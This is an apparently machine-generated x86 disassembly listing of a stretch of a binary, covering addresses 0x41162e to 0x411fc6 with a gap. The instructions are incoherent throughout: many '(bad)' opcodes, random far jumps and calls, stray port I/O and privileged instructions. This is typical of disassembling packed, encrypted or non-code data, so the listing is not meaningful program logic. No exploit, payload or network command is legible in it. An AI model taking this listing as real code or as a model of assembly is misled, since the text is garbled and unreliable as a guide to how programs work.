  41162e:	outs   dx,DWORD PTR ds:[esi]
  41162f:	pop    ds
  411630:	sbb    al,0x38
  411632:	mov    eax,0x19b4798d
  411637:	es and esp,ebx
  41163a:	mov    bl,0x57
  41163c:	or     al,0x6b
  41163e:	add    dl,BYTE PTR [edi]
  411640:	jbe    0x41160a
  411642:	ret    0xce72
  411645:	jmp    0x97cd:0x5348a855
  41164c:	aad    0x8a
  41164e:	pop    eax
  41164f:	pop    eax
  411650:	dec    esi
  411651:	int3   
  411652:	aas    
  411653:	test   al,0xc2
  411655:	out    dx,al
  411656:	inc    esi
  411657:	dec    BYTE PTR [edi+0x47440659]
  41165d:	xchg   ah,bh
  41165f:	push   cs
  411660:	(bad)  [ecx-0x32b4c13d]
  411666:	call   0x510c778d
  41166b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41166c:	or     DWORD PTR ds:0xca15c3f2,edx
  411672:	int3   
  411673:	imul   ebp,DWORD PTR [eax*2+0x2e98d6de],0x8dc2c059
  41167e:	cwde   
  41167f:	loopne 0x411646
  411681:	pop    esi
  411682:	and    dh,bl
  411684:	sar    DWORD PTR [ebx],0xa0
  411687:	xor    eax,0x53baa256
  41168c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41168d:	stos   BYTE PTR es:[edi],al
  41168e:	rol    DWORD PTR [edi+0x5d874d8a],1
  411694:	cmp    edx,eax
  411696:	push   cs
  411697:	adc    esp,0xa80bf278
  41169d:	out    dx,al
  41169e:	sbb    ebx,DWORD PTR [edi+0x766c0d89]
  4116a4:	popa   
  4116a5:	les    ebx,FWORD PTR [ebx-0x321e38b4]
  4116ab:	neg    DWORD PTR [ecx]
  4116ad:	clc    
  4116ae:	in     eax,0x56
  4116b0:	rcr    BYTE PTR [ebx-0x3998366],1
  4116b6:	nop
  4116b7:	inc    ebx
  4116b8:	sbb    edi,DWORD PTR [edi]
  4116ba:	ror    BYTE PTR [esi],cl
  4116bc:	mov    esp,0xebd3532c
  4116c1:	fcom   DWORD PTR [ebx+0x23fcfc6c]
  4116c7:	mov    bp,0xb6c0
  4116cb:	jbe    0x41168c
  4116cd:	retf   
  4116ce:	jo     0x4116b7
  4116d0:	xchg   ebp,eax
  4116d1:	jecxz  0x411718
  4116d3:	pushf  
  4116d4:	mov    edx,0x9b54a4ab
  4116d9:	lea    eax,[edi]
  4116db:	js     0x411757
  4116dd:	push   ds
  4116de:	lods   al,BYTE PTR ds:[esi]
  4116df:	mov    ah,0x1d
  4116e1:	mov    al,0x2c
  4116e3:	push   esi
  4116e4:	scas   al,BYTE PTR es:[edi]
  4116e5:	jecxz  0x4116a3
  4116e7:	push   0xffffffc6
  4116e9:	outs   dx,BYTE PTR ds:[esi]
  4116ea:	cs (bad) 
  4116ed:	test   eax,0x3f8d4e62
  4116f2:	popa   
  4116f3:	imul   eax,eax,0xffffff95
  4116f6:	(bad)  [ecx]
  4116f8:	ror    ebp,1
  4116fa:	or     eax,0x706af39f
  4116ff:	mov    ds:0x7e4a0bd8,al
  411704:	mov    ah,0x57
  411706:	push   cs
  411707:	mov    bh,0xbb
  411709:	mov    bh,0x18
  41170b:	pmaddwd mm0,QWORD PTR ds:0x6a096cb0
  411712:	test   BYTE PTR [ebp-0x20],bh
  411715:	aad    0x69
  411717:	pop    esi
  411718:	call   0xa47e204
  41171d:	mov    al,ds:0x3167093e
  411722:	push   edi
  411723:	xchg   esp,eax
  411724:	ror    DWORD PTR [edx+0x319cf0db],1
  41172a:	pop    edx
  41172b:	inc    esi
  41172c:	add    al,0x8f
  41172e:	call   FWORD PTR [ebx-0x1b62e49d]
  411734:	jno    0x411708
  411736:	ds cmp eax,0x4dab527c
  41173c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41173d:	mov    esi,0xe6f1d11d
  411742:	lahf   
  411743:	test   al,0xd6
  411745:	dec    esi
  411746:	iret   
  411747:	push   ecx
  411748:	adc    dl,BYTE PTR [edx-0x668dae69]
  41174e:	sub    edx,edi
  411750:	lock fild WORD PTR [ebx]
  411753:	data16 cmp BYTE PTR [esi+ecx*4],ah
  411757:	scas   al,BYTE PTR es:[edi]
  411758:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411759:	and    DWORD PTR ds:[ebp-0x33],eax
  41175d:	js     0x41175b
  41175f:	jbe    0x41175e
  411761:	inc    ebx
  411762:	fwait
  411763:	cs in  al,dx
  411765:	out    0x82,eax
  411767:	fsubp  st(4),st
  411769:	fs scas eax,DWORD PTR es:[edi]
  41176b:	add    cl,bh
  41176d:	idiv   BYTE PTR [ebx+0x3538e920]
  411773:	ins    DWORD PTR es:[edi],dx
  411774:	or     BYTE PTR [ebp+0x3bcb833e],dh
  41177a:	adc    dh,dl
  41177c:	cmp    eax,edi
  41177e:	les    eax,FWORD PTR [edi+0x5a66d27e]
  411784:	push   ecx
  411785:	xor    bh,bl
  411787:	mov    edi,0xe4412ad1
  41178c:	in     eax,0x63
  41178e:	xchg   ebp,eax
  41178f:	jg     0x411791
  411791:	sbb    BYTE PTR [esi+0x25],0x2f
  411795:	inc    edx
  411796:	jmp    0xf694:0x526cca17
  41179d:	inc    ebp
  41179e:	sub    eax,DWORD PTR [edx-0x3]
  4117a1:	inc    ecx
  4117a2:	mov    dl,0x69
  4117a4:	add    al,0x9
  4117a6:	das    
  4117a7:	cmp    eax,0xf991a580
  4117ac:	icebp  
  4117ad:	or     DWORD PTR [edx+0x56],esp
  4117b0:	(bad)  
  4117b1:	jne    0x4117a3
  4117b3:	repnz cmp bh,dl
  4117b6:	test   DWORD PTR [edx],ecx
  4117b8:	in     al,0xd6
  4117ba:	inc    esp
  4117bb:	pop    ecx
  4117bc:	es mov eax,0x450080bf
  4117c2:	rcr    BYTE PTR [ebx+0x4967c7cc],1
  4117c8:	cs jne 0x41177d
  4117cb:	cmp    DWORD PTR [edi-0xa],0x526402aa
  4117d2:	and    esp,DWORD PTR [eax+0x7d7e91b7]
  4117d8:	call   0x3de04645
  4117dd:	retf   0x25c4
  4117e0:	loope  0x411812
  4117e2:	in     al,dx
  4117e3:	ins    BYTE PTR es:[edi],dx
  4117e4:	pop    ds
  4117e5:	shr    BYTE PTR [eax+ebp*4-0x56b07786],1
  4117ec:	cli    
  4117ed:	jl     0x411804
  4117ef:	dec    eax
  4117f0:	sbb    dh,BYTE PTR [ebx]
  4117f2:	mov    al,0x99
  4117f4:	sub    al,0xd1
  4117f6:	sub    BYTE PTR [ecx+eax*1-0x14],dl
  4117fa:	out    dx,eax
  4117fb:	xchg   DWORD PTR [esi],eax
  4117fd:	es aaa 
  4117ff:	cmc    
  411800:	(bad)  
  411802:	push   es
  411803:	xchg   ebx,eax
  411804:	inc    ebx
  411805:	cmp    al,0x2a
  411807:	xchg   esi,eax
  411808:	lahf   
  411809:	pop    esi
  41180a:	mov    ch,bl
  41180c:	sbb    eax,0x99c148ed
  411811:	push   edx
  411812:	jmp    FWORD PTR [ecx+0xd10ca99]
  411818:	lods   al,BYTE PTR ds:[esi]
  411819:	jle    0x411824
  41181b:	in     al,dx
  41181c:	call   0x2f5fb558
  411821:	sub    eax,esp
  411823:	ins    DWORD PTR es:[edi],dx
  411824:	data16 cs mov al,0xd0
  411828:	adc    bh,BYTE PTR [ebx+edi*8-0x3389501e]
  41182f:	push   ecx
  411830:	mov    esp,esi
  411832:	pop    esp
  411833:	add    dl,al
  411835:	cmp    BYTE PTR [ebp+edi*8+0x4a4967e6],0x41
  41183d:	pop    edx
  41183e:	jmp    0xa23a6437
  411843:	outs   dx,BYTE PTR ds:[esi]
  411844:	dec    ebp
  411845:	lods   eax,DWORD PTR ds:[esi]
  411846:	mov    al,0x61
  411848:	fmul   DWORD PTR [esp+esi*8]
  41184b:	fstp   DWORD PTR [ecx+0x51]
  41184e:	ficom  WORD PTR [esi]
  411850:	out    dx,al
  411851:	or     ebx,DWORD PTR [ebx]
  411853:	push   eax
  411854:	mov    ebx,0x60763b39
  411859:	sub    eax,0x4351bc7c
  41185e:	icebp  
  41185f:	cmp    cl,al
  411861:	shl    dl,cl
  411863:	fisubr DWORD PTR [edi]
  411865:	add    ebp,DWORD PTR [ebx-0x76]
  411868:	sbb    al,0x75
  41186a:	rcl    DWORD PTR [ebx-0x5d9f0be8],1
  411870:	sub    BYTE PTR [ebp+ebp*4-0x4f41c101],ch
  411877:	push   esp
  411878:	xlat   BYTE PTR ds:[ebx]
  411879:	add    eax,0x1759b6ef
  41187e:	jno    0x411855
  411880:	fnstcw WORD PTR [edi-0x68215f90]
  411886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411887:	pop    ecx
  411888:	cmc    
  411889:	jle    0x41182a
  41188b:	div    DWORD PTR [esi+0x3e]
  41188e:	dec    DWORD PTR cs:[ecx]
  411891:	inc    BYTE PTR [ecx]
  411893:	in     eax,dx
  411894:	lahf   
  411895:	mov    dh,0x24
  411897:	fmul   QWORD PTR [ecx-0x77]
  41189a:	adc    eax,0x788d2cf4
  41189f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118a0:	and    DWORD PTR [ebp+0x61],ecx
  4118a3:	and    edi,DWORD PTR [ecx+0x55]
  4118a6:	mov    ds:0xbc695eb1,al
  4118ab:	mov    ah,0x74
  4118ad:	icebp  
  4118ae:	jno    0x41187f
  4118b0:	neg    DWORD PTR ds:0x1f516a0f
  4118b6:	imul   ebp,DWORD PTR [edx+esi*4],0xffffff94
  4118ba:	scas   eax,DWORD PTR es:[edi]
  4118bb:	and    edx,edx
  4118bd:	retf   0x51ae
  4118c0:	(bad)  
  4118c1:	and    dl,cl
  4118c3:	ret    0x8497
  4118c6:	call   0xde00:0x9b0635ab
  4118cd:	cmp    BYTE PTR ds:0xb657fab5,bh
  4118d3:	aaa    
  4118d4:	and    al,0xa1
  4118d6:	lock xor eax,0xe6d637e4
  4118dc:	pusha  
  4118dd:	enterw 0xc697,0x4d
  4118e2:	fadd   DWORD PTR fs:[esi+0x6b]
  4118e6:	test   DWORD PTR [ecx+0x731015ba],esi
  4118ec:	imul   ebp,eax,0x15ac7779
  4118f2:	mov    BYTE PTR [edx],al
  4118f4:	push   ss
  4118f5:	adc    DWORD PTR [edx+0x65],edx
  4118f8:	sbb    DWORD PTR [eax-0x1fe1feb7],edx
  4118fe:	xor    esp,eax
  411900:	pop    esp
  411901:	loope  0x411945
  411903:	pop    eax
  411904:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411905:	add    eax,0xdb3a6a41
  41190a:	xchg   ebp,eax
  41190b:	jne    0x41195e
  41190d:	push   edi
  41190e:	jae    0x4118c3
  411910:	in     al,dx
  411911:	push   ss
  411912:	mov    ?,WORD PTR [esi+edi*4-0xe]
  411916:	push   0xffffff88
  411918:	sbb    eax,0x2c3fe083
  41191d:	imul   esp,DWORD PTR [esi-0x5464c9],0xffffff81
  411924:	jno    0x4118de
  411926:	pop    eax
  411927:	inc    ebp
  411928:	xchg   edx,eax
  411929:	push   edi
  41192a:	std    
  41192b:	ins    DWORD PTR es:[edi],dx
  41192c:	cmp    BYTE PTR [ebx],cl
  41192e:	into   
  41192f:	cmc    
  411930:	mov    edi,0xae984516
  411935:	ins    DWORD PTR es:[edi],dx
  411936:	out    dx,eax
  411937:	(bad)  
  411938:	sub    edi,DWORD PTR [edi+0x59ea6f33]
  41193e:	push   0xf84b67f0
  411943:	xor    BYTE PTR [ebp-0x39],0xa6
  411947:	sti    
  411948:	(bad)  
  411949:	sbb    ah,BYTE PTR [esi]
  41194b:	shl    ecx,cl
  41194d:	imul   ebx,edx,0xcb31a98e
  411953:	rcr    al,0x30
  411956:	mov    edx,0xbef5e1bc
  41195b:	mov    bl,0xf1
  41195d:	jle    0x4118f8
  41195f:	ss dec ebx
  411961:	push   ebx
  411962:	call   0xa012:0xcd04483b
  411969:	cli    
  41196a:	xor    ecx,ebx
  41196c:	pushf  
  41196d:	inc    ecx
  41196e:	push   cs
  41196f:	stc    
  411970:	xchg   ebx,eax
  411971:	sbb    DWORD PTR [ebx-0x6b],0xce3689e7
  411978:	push   0x975d0d33
  41197d:	mov    eax,ds:0x823edf3d
  411982:	aaa    
  411983:	mov    WORD PTR [ebx],cs
  411985:	push   eax
  411986:	or     DWORD PTR [eax+0x40],eax
  411989:	imul   edi,edx,0xa4625ab9
  41198f:	test   BYTE PTR [ecx+esi*1],al
  411992:	mov    eax,0xb019765
  411997:	stos   DWORD PTR es:[edi],eax
  411998:	cmp    DWORD PTR [eax+0x28],eax
  41199b:	mov    al,ds:0x98d1682d
  4119a0:	and    ebp,DWORD PTR [ecx-0x6808789b]
  4119a6:	in     al,dx
  4119a7:	pop    esi
  4119a8:	arpl   di,bx
  4119aa:	daa    
  4119ab:	mov    esp,DWORD PTR [ebp+0x5cfd9e32]
  4119b1:	pop    ds
  4119b2:	(bad)  
  4119b4:	ins    DWORD PTR es:[edi],dx
  4119b5:	cdq    
  4119b6:	lahf   
  4119b7:	pop    es
  4119b8:	imul   edx,DWORD PTR [edx],0x3c
  4119bb:	(bad)  
  4119bc:	imul   DWORD PTR [edi+eax*8+0x3a]
  4119c0:	cmp    al,BYTE PTR [eax-0x49]
  4119c3:	fstp   TBYTE PTR [eax+0x5a372fe5]
  4119c9:	popf   
  4119ca:	dec    edi
  4119cb:	push   cs
  4119cc:	pop    ebx
  4119cd:	mov    al,0x6e
  4119cf:	adc    ebx,eax
  4119d1:	(bad)  
  4119d2:	jmp    0x51ee:0x95d641cb
  4119d9:	nop
  4119da:	adc    bl,cl
  4119dc:	lahf   
  4119dd:	out    0x29,al
  4119df:	jmp    0x411980
  4119e1:	push   esp
  4119e2:	sbb    ah,BYTE PTR [edx+0xc]
  4119e5:	ins    BYTE PTR es:[edi],dx
  4119e6:	push   edx
  4119e7:	ret    
  4119e8:	sbb    ch,BYTE PTR [ecx-0x9a11965]
  4119ee:	mov    al,dl
  4119f0:	or     DWORD PTR [ebp+0x102bf7b0],esp
  4119f6:	out    dx,eax
  4119f7:	jg     0x4119ef
  4119f9:	stos   BYTE PTR es:[edi],al
  4119fa:	pop    edx
  4119fb:	les    ebx,FWORD PTR [ebx-0x27]
  4119fe:	mov    fs,WORD PTR [ebp-0x57]
  411a01:	sub    ch,ah
  411a03:	ins    DWORD PTR es:[edi],dx
  411a04:	pop    edi
  411a05:	mov    bl,0x65
  411a07:	or     al,0x63
  411a09:	mov    ebp,0x112f7e98
  411a0e:	push   es
  411a0f:	pop    ecx
  411a10:	repz xchg ebp,eax
  411a12:	dec    esi
  411a13:	pop    edi
  411a14:	sbb    edi,esp
  411a16:	(bad)  
  411a17:	ins    DWORD PTR es:[edi],dx
  411a18:	arpl   WORD PTR [ebx],bp
  411a1a:	jbe    0x411a7a
  411a1c:	sbb    ebx,ebp
  411a1e:	xchg   ebx,eax
  411a1f:	pop    ebp
  411a20:	gs popf 
  411a22:	retf   0xc10c
  411a25:	jnp    0x411aa2
  411a27:	test   DWORD PTR [edx-0x4e1769cc],edx
  411a2d:	xor    bl,BYTE PTR [ebp+0x24]
  411a30:	pop    es
  411a31:	fwait
  411a32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a33:	(bad)  
  411a34:	imul   edx,edx,0x7c
  411a37:	jg     0x411a09
  411a39:	arpl   WORD PTR [ebx-0x4b],cx
  411a3c:	add    dl,BYTE PTR [eax-0x21cc1c39]
  411a42:	idiv   BYTE PTR [ecx+eiz*4+0x7b31638b]
  411a49:	dec    esi
  411a4a:	adc    bl,al
  411a4c:	into   
  411a4d:	add    eax,0x49b9c24b
  411a52:	pusha  
  411a53:	aas    
  411a54:	sub    eax,0x51c9633f
  411a59:	mov    ebp,0x11eeb660
  411a5e:	pusha  
  411a5f:	sbb    bh,bl
  411a61:	mov    al,0x7d
  411a63:	in     eax,dx
  411a64:	aad    0x1a
  411a66:	loope  0x411a9f
  411a68:	mov    esp,0xa8
	...
  411c45:	add    BYTE PTR [edi],ah
  411c47:	and    eax,0xbb873b85
  411c4c:	mov    edi,0xe22d13d
  411c51:	pusha  
  411c52:	jo     0x411cb6
  411c54:	inc    ebx
  411c55:	scas   eax,DWORD PTR es:[edi]
  411c56:	sti    
  411c57:	jbe    0x411c5a
  411c59:	add    BYTE PTR [eax],ah
  411c5b:	pop    es
  411c5c:	add    BYTE PTR [eax],al
  411c5e:	mov    bh,0x51
  411c60:	xor    al,0xdc
  411c62:	es mov dh,0x25
  411c65:	fild   DWORD PTR [edx+0x1f7c6219]
  411c6b:	cmp    dl,BYTE PTR ds:[esi-0x737973e9]
  411c72:	fidivr DWORD PTR [eax-0x15]
  411c75:	xor    eax,0xa916d13
  411c7a:	mov    dl,BYTE PTR [esi+eax*1-0x36fe8d64]
  411c81:	es push es
  411c83:	mov    ebp,DWORD PTR [ecx]
  411c85:	pop    eax
  411c86:	enter  0xf6c0,0xc3
  411c8a:	(bad)  
  411c8c:	xchg   DWORD PTR [esi+0x71],ebx
  411c8f:	scas   eax,DWORD PTR es:[edi]
  411c90:	in     al,dx
  411c91:	mov    eax,ds:0xb6188ad4
  411c96:	push   edx
  411c97:	xor    ecx,edx
  411c99:	push   ebp
  411c9a:	push   ebp
  411c9b:	mov    ebp,0xf083df8f
  411ca0:	stc    
  411ca1:	xchg   ebx,eax
  411ca2:	add    eax,0x7e662430
  411ca7:	sti    
  411ca8:	inc    esp
  411ca9:	mov    edx,0x1e2f8d52
  411cae:	dec    ebx
  411caf:	jnp    0x411ca7
  411cb1:	pop    esi
  411cb2:	enter  0x151c,0x6b
  411cb6:	jl     0x411ca7
  411cb8:	retf   
  411cb9:	test   al,0xf
  411cbb:	jne    0x411c54
  411cbd:	bound  eax,QWORD PTR [eax-0x17]
  411cc0:	add    DWORD PTR [edi],eax
  411cc2:	sbb    esi,DWORD PTR [edi]
  411cc4:	sbb    DWORD PTR [ebx+0x439652b5],edx
  411cca:	or     bh,dh
  411ccc:	adc    al,0x92
  411cce:	shr    DWORD PTR [ebx],1
  411cd0:	push   ss
  411cd1:	adc    esi,edx
  411cd3:	or     DWORD PTR [ebx-0x1282056f],edi
  411cd9:	leave  
  411cda:	in     al,0x77
  411cdc:	push   ecx
  411cdd:	sbb    eax,ebx
  411cdf:	daa    
  411ce0:	rcr    edi,1
  411ce2:	pushf  
  411ce3:	fldcw  WORD PTR [bx+di-0x78]
  411ce7:	stos   BYTE PTR es:[edi],al
  411ce8:	or     al,0x54
  411cea:	inc    edi
  411ceb:	sar    DWORD PTR [edx+0x36],0x1b
  411cef:	mov    cl,0x5a
  411cf1:	(bad)  
  411cf2:	jg     0x411cd8
  411cf4:	or     BYTE PTR [edx],cl
  411cf6:	add    ch,al
  411cf8:	mov    cl,0xd2
  411cfa:	in     eax,dx
  411cfb:	cmc    
  411cfc:	mov    cs,WORD PTR [ebx+edx*8-0x4f]
  411d00:	mov    cl,0xfa
  411d02:	int3   
  411d03:	jle    0x411c97
  411d05:	and    BYTE PTR [edi],0x6a
  411d08:	in     al,0x18
  411d0a:	xchg   edx,eax
  411d0b:	ins    BYTE PTR es:[edi],dx
  411d0c:	pop    esi
  411d0d:	xchg   esi,eax
  411d0e:	mov    ds:0xaf58f62d,al
  411d13:	mov    bh,BYTE PTR [ebx-0x63]
  411d16:	mov    ds:0xf2768e17,eax
  411d1b:	div    esi
  411d1d:	js     0x411ce0
  411d1f:	aad    0xd
  411d21:	fimul  WORD PTR ds:0xd5c9f85f
  411d27:	push   esi
  411d28:	push   eax
  411d29:	sbb    DWORD PTR [esi-0x7e],ecx
  411d2c:	jmp    0xc3774713
  411d31:	das    
  411d32:	pop    es
  411d33:	and    eax,0xd22d77b3
  411d38:	pop    edi
  411d39:	add    eax,0x7ab57f5
  411d3e:	cmp    cl,dl
  411d40:	xor    dh,BYTE PTR [ebx-0x2e]
  411d43:	mov    ecx,0x2ea73db4
  411d48:	in     al,0x4b
  411d4a:	push   0xffffff82
  411d4c:	in     eax,0x40
  411d4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d4f:	jmp    0x5c0d:0xd027d862
  411d56:	push   eax
  411d57:	push   edx
  411d58:	add    al,0xc7
  411d5a:	or     BYTE PTR [esp-0x69],al
  411d5e:	repz sahf 
  411d60:	fcomp  st(0)
  411d62:	push   ds
  411d63:	cwde   
  411d64:	nop
  411d65:	cmp    BYTE PTR [ebp+0x75],dl
  411d68:	loope  0x411cff
  411d6a:	cmp    BYTE PTR [eax+0x7b],0x66
  411d6e:	pop    esp
  411d6f:	sbb    DWORD PTR [esi],esi
  411d71:	or     BYTE PTR [esi],dl
  411d73:	popf   
  411d74:	xor    cl,0xa5
  411d77:	push   0xffffffd7
  411d79:	sbb    BYTE PTR [eax-0x2343b81a],0xd5
  411d80:	loopne 0x411d91
  411d82:	mov    al,ds:0xde32fe1a
  411d87:	or     BYTE PTR [edi],ah
  411d89:	hlt    
  411d8a:	pop    eax
  411d8b:	xor    edx,DWORD PTR [eax+0x67]
  411d8e:	popf   
  411d8f:	mov    BYTE PTR [eax+0x52],al
  411d92:	scas   al,BYTE PTR es:[edi]
  411d93:	push   ebx
  411d94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d95:	push   ecx
  411d96:	pop    ebp
  411d97:	mov    ds:0x20048bfc,eax
  411d9c:	mov    ds:0x98fd1c33,eax
  411da1:	out    0x97,eax
  411da3:	fs xchg ebx,eax
  411da5:	adc    DWORD PTR [edi-0xdaee749],edx
  411dab:	sub    eax,0xc6a1a4e7
  411db0:	imul   edx,DWORD PTR [edx+edx*2],0x25766381
  411db7:	sbb    dl,BYTE PTR ds:[ebp+0x61163d27]
  411dbe:	push   edi
  411dbf:	rcl    bh,1
  411dc1:	dec    esp
  411dc2:	lock adc cl,BYTE PTR [ecx+0x772ab93d]
  411dc9:	cmp    ebx,ebx
  411dcb:	inc    ebp
  411dcc:	cld    
  411dcd:	push   0xbb71f2af
  411dd2:	js     0x411de6
  411dd4:	sub    al,BYTE PTR [eax]
  411dd6:	jg     0x411e2d
  411dd8:	arpl   WORD PTR [ebx],dx
  411dda:	pop    es
  411ddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ddc:	cmc    
  411ddd:	dec    ebx
  411dde:	out    dx,eax
  411ddf:	mov    ah,0xcc
  411de1:	fucomp st(7)
  411de3:	dec    eax
  411de4:	inc    ebp
  411de5:	sti    
  411de6:	xchg   DWORD PTR [edi-0x79fb4635],ecx
  411dec:	ret    0x3edb
  411def:	pusha  
  411df0:	sahf   
  411df1:	push   edi
  411df2:	inc    edi
  411df3:	pop    ds
  411df4:	and    ch,BYTE PTR [ecx-0x7]
  411df7:	cmp    eax,0x451d3367
  411dfc:	jp     0x411dee
  411dfe:	retf   
  411dff:	mov    dh,0x8c
  411e01:	maskmovq mm6,(bad)
  411e02:	div    DWORD PTR [esi-0x5a]
  411e05:	inc    ebx
  411e06:	or     edx,esi
  411e08:	jbe    0x411e78
  411e0a:	xchg   esi,eax
  411e0b:	and    eax,0xef7826cb
  411e10:	pop    edx
  411e11:	aad    0x93
  411e13:	jl     0x411db3
  411e15:	mov    ah,0x41
  411e17:	aas    
  411e18:	push   edx
  411e19:	ds popa 
  411e1b:	scas   eax,DWORD PTR es:[edi]
  411e1c:	call   0xecf93294
  411e21:	dec    edx
  411e22:	lock jae 0x411e90
  411e25:	dec    eax
  411e26:	pop    es
  411e27:	or     BYTE PTR [edi+ebx*4-0x3b6aa124],al
  411e2e:	xchg   ebp,eax
  411e2f:	stos   DWORD PTR es:[edi],eax
  411e30:	pop    esi
  411e31:	and    BYTE PTR [esi],ah
  411e33:	out    dx,al
  411e34:	mov    ah,0x47
  411e36:	mov    ecx,esi
  411e38:	push   esp
  411e39:	clc    
  411e3a:	es sub cl,cl
  411e3d:	push   edi
  411e3e:	jg     0x411eac
  411e40:	das    
  411e41:	gs hlt 
  411e43:	jbe    0x411e14
  411e45:	stos   BYTE PTR es:[edi],al
  411e46:	cs xchg ebp,eax
  411e48:	jbe    0x411e57
  411e4a:	scas   eax,DWORD PTR es:[edi]
  411e4b:	xor    DWORD PTR [eax+ecx*1],0xffffffdb
  411e4f:	xchg   edi,eax
  411e50:	mov    fs,WORD PTR [ecx-0x7469709f]
  411e56:	push   0x6f
  411e58:	arpl   WORD PTR [ebp+0x2f],ax
  411e5b:	dec    ebx
  411e5c:	ror    DWORD PTR [edx+0xc],1
  411e5f:	add    BYTE PTR [ebx-0x23caa2ad],dh
  411e65:	adc    DWORD PTR [edx-0x334c493f],eax
  411e6b:	mov    bl,0x79
  411e6d:	imul   eax,DWORD PTR [ebx+0x3a21f5ae],0x9d2f6663
  411e77:	cmp    al,0x2c
  411e7a:	push   ebp
  411e7b:	add    esp,DWORD PTR [ecx+0x38]
  411e7e:	jecxz  0x411ea6
  411e80:	mov    bl,0x12
  411e82:	sbb    esi,DWORD PTR [edi+0x24]
  411e85:	(bad)  
  411e87:	sub    DWORD PTR [ecx+0x49],edi
  411e8a:	lahf   
  411e8b:	rcr    BYTE PTR [edx],1
  411e8d:	cwde   
  411e8e:	iret   
  411e8f:	rcr    BYTE PTR [ebx-0x6085e5ec],cl
  411e95:	stos   DWORD PTR es:[edi],eax
  411e96:	push   0x2945df65
  411e9b:	jmp    0xd66b:0xeb1fb3c0
  411ea2:	jmp    FWORD PTR [eax+0x1374fbaf]
  411ea8:	fistp  WORD PTR [edi-0x5e]
  411eab:	xor    edx,DWORD PTR [edi+edi*8]
  411eae:	push   cs
  411eaf:	adc    al,0x71
  411eb1:	sub    BYTE PTR [edx],ah
  411eb3:	inc    ebp
  411eb4:	or     al,0xb
  411eb6:	bound  eax,QWORD PTR [eax+ebp*4-0x4a]
  411eba:	sub    edx,DWORD PTR [ebp+0x11]
  411ebd:	stc    
  411ebe:	xchg   edx,eax
  411ebf:	loopne 0x411e44
  411ec1:	pavgb  mm3,QWORD PTR [edi+0x65]
  411ec5:	dec    ebp
  411ec6:	mov    edx,0x6e87c886
  411ecb:	out    0x38,eax
  411ecd:	cmp    cl,ch
  411ecf:	rcl    BYTE PTR ds:0x1f983486,0x5e
  411ed6:	mov    ch,0x33
  411ed8:	xor    esp,DWORD PTR [eax-0x42]
  411edb:	mov    eax,ds:0xc94cd742
  411ee0:	stos   DWORD PTR es:[edi],eax
  411ee1:	test   BYTE PTR [edx+0x7522521e],dl
  411ee7:	mov    eax,ds:0x446a468f
  411eec:	mov    esp,0xb2ef9e2d
  411ef1:	pop    edx
  411ef2:	fnstsw WORD PTR [ecx+0x13]
  411ef5:	out    0xf,al
  411ef7:	or     DWORD PTR [eax],edi
  411ef9:	jo     0x411ea5
  411efb:	dec    esi
  411efc:	mov    eax,ds:0xca2aa0c
  411f01:	in     al,dx
  411f02:	(bad)  
  411f04:	and    al,0x55
  411f06:	addr16 inc ebp
  411f08:	das    
  411f09:	rcl    ah,cl
  411f0b:	adc    eax,0x85c60633
  411f10:	test   BYTE PTR [ebp+0x13],0x39
  411f14:	out    dx,eax
  411f15:	jge    0x411e99
  411f17:	jno    0x411eb5
  411f19:	xor    bl,BYTE PTR [esi]
  411f1b:	das    
  411f1c:	sub    DWORD PTR [edx+0xc772e11],0xa
  411f23:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  411f25:	loope  0x411f29
  411f27:	arpl   WORD PTR [eax],di
  411f29:	xor    BYTE PTR [eax+edx*2+0x38b62de9],ch
  411f30:	mov    al,ds:0x176e023
  411f35:	pushf  
  411f36:	hlt    
  411f37:	and    eax,0x9b5039d9
  411f3c:	push   ecx
  411f3d:	(bad)  
  411f3e:	sub    eax,0x1a420e38
  411f43:	push   ecx
  411f44:	sbb    al,0x48
  411f46:	pop    ss
  411f47:	mov    edx,0xb3d20f7e
  411f4c:	or     esp,esp
  411f4e:	adc    eax,0xa72218ad
  411f53:	inc    ecx
  411f54:	add    eax,0xd6db6c85
  411f59:	push   esp
  411f5a:	push   ecx
  411f5b:	or     edi,ebp
  411f5d:	push   esp
  411f5e:	xchg   ebp,eax
  411f5f:	or     al,0xe9
  411f61:	lock jne 0x411f8e
  411f64:	arpl   WORD PTR [eax],bx
  411f66:	lea    esp,[esi+edx*1-0x3c]
  411f6a:	fcomip st,st(7)
  411f6c:	mov    BYTE PTR ds:0x86b5ecc3,ch
  411f72:	call   0x944d5c52
  411f77:	cld    
  411f78:	xor    al,0x16
  411f7a:	imul   edx,DWORD PTR [edx],0x837a62a
  411f80:	dec    eax
  411f81:	mov    esp,esp
  411f83:	daa    
  411f84:	out    0xcd,al
  411f86:	loop   0x411f27
  411f88:	mov    esp,0x16c462ee
  411f8d:	mov    BYTE PTR [eax+0x3c],0x8a
  411f91:	rcr    BYTE PTR [edx],0xe1
  411f94:	jno    0x411f74
  411f96:	pop    ss
  411f97:	fimul  DWORD PTR [edx+0x463d010f]
  411f9d:	jns    0x411f77
  411f9f:	adc    eax,0x171ce964
  411fa4:	std    
  411fa5:	inc    edi
  411fa6:	iret   
  411fa7:	scas   eax,DWORD PTR es:[edi]
  411fa8:	xchg   ecx,eax
  411fa9:	inc    edx
  411faa:	dec    edi
  411fab:	sub    eax,0xb0d44edd
  411fb0:	jae    0x411fba
  411fb2:	dec    ecx
  411fb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fb5:	or     esi,DWORD PTR [edx+0x4c]
  411fb8:	pop    ebp
  411fb9:	sbb    al,0x81
  411fbb:	lods   eax,DWORD PTR ds:[esi]
  411fbc:	in     al,0x44
  411fbe:	jg     0x41201b
  411fc0:	arpl   dx,si
  411fc2:	in     al,0x1c
  411fc4:	dec    esp
  411fc5:	iret   
  411fc6:	popa   
